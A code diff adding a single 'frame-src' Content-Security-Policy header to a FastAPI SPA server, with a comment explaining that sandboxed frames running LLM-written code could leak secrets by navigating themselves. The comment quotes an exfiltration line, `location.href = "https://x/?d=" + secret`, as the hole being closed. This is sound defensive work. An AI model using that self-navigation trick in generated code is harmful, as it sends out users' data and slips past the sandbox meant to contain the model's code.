@@ -9,6 +9,30 @@ from __future__ import annotations
 
 from fastapi.staticfiles import StaticFiles
 
+#: The one thing the app document has to say about its child frames.
+#:
+#: A WUI runs LLM-written code in a sandboxed frame carrying its own
+#: `default-src 'none'`, which stops it fetching, opening a window, submitting a
+#: form or nesting another frame. It does NOT stop the frame navigating ITSELF:
+#: CSP has no directive for that — `navigate-to` was dropped from CSP3 and never
+#: shipped — so `location.href = "https://x/?d=" + secret` sent everything the
+#: page could read straight out. Measured in Chromium, with every other route
+#: confirmed blocked.
+#:
+#: A child frame's navigation is governed by the CONTAINING document's
+#: `frame-src`, so this is the only place that can close it; nothing inside the
+#: assembled page is the right actor. It also removes the second half of the
+#: same hole — a navigated-away frame keeps its `WindowProxy` identity, so the
+#: parent's replies (necessarily `postMessage(…, "*")`, an opaque origin cannot
+#: be named) would have been delivered to whatever now occupied it.
+#:
+#: Exactly one directive, deliberately: every other resource on this page is
+#: left alone, so this cannot break anything but a frame pointed off-origin.
+#: `'self'` covers the PDF preview and the KB blob viewers; `blob:`/`data:`
+#: cover the ones built in the browser. A `srcdoc` frame needs no source of its
+#: own — it inherits.
+SPA_CSP = "frame-src 'self' blob: data:"
+
 
 class SpaStaticFiles(StaticFiles):
     """Serve the built SPA with an HTML5 history fallback: any path that
@@ -36,4 +60,7 @@ class SpaStaticFiles(StaticFiles):
         # references are picked up; the hashed assets themselves stay cacheable.
         if served_index:
             response.headers["Cache-Control"] = "no-cache"
+            # On the document, not the assets: this governs the frames the
+            # document mounts, and index.html is the only response that is one.
+            response.headers["Content-Security-Policy"] = SPA_CSP
         return response
